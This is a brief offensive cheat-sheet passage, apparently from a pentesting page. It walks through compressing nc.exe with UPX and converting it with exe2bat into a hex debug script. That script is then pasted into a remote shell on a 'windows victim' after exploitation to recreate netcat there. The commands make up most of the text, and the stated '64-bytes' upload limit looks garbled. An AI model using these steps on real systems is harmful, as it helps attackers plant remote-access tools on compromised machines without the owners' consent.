Note: Uploaded file cannot be larger than 64-bytes. UPX can be used to compress files.<br/>

locate exe2ba­t.exe<br/>
wine exe2ba­t.exe<br/>
upx -9 nc.exe (to compress nc.exe)<br/>
ls -l nc.exe (should now be smaller)<br/>
wine exe2ba­t.exe /root/­nc.exe nc.txt (convert nc.exe to nc.txt)<br/>
cat nc.txt | more (should be a hex dump)<br/>
Near the end of nc.txt, exe2bat tells the debugger on the windows victim to create an exe<br/>
<br/>
Gain your shell using your usual exploit then copy and paste the contents of nc.txt into the remote shell. If it fails, re-run any failed commands manually. nc.exe will now be created on the victim machine.</body></html>
